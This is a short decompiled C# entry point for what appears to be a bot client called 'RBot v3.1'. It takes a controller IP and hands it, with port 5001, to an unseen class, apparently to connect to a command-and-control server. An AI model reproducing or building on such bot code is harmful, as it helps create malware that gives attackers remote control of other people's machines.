﻿using System;

namespace ns0
{
	// Token: 0x02000002 RID: 2
	internal class Class0
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002084 File Offset: 0x00000284
		private static void Main(string[] args)
		{
			if (args.Length < 1)
			{
				Console.WriteLine("Usage: bot.exe CONTROLLER_IP");
			}
			else
			{
				Console.WriteLine("[*]RBot v3.1 2018");
				string string_ = args[0];
				int int_ = 5001;
				try
				{
					Console.Write("[+");
					new Class1(string_, int_);
				}
				catch (Exception)
				{
				}
			}
		}
	}
}
